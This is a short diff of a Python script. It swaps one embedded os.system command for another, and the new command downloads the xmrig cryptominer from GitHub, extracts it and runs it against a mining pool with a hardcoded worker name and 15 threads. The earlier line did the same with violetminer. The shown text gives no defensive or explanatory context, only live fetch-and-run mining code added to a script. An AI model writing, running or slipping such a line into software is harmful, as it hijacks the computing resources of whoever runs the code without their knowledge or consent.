@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool 172.65.222.237:443 --username nung.001 --password 123 --disableNVIDIA --threads 16")
+os.system ("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a cn/r -o stc.ss.poolin.one:443 -u nung.001 --keepalive --donate-level 1 -p x -t 15") 
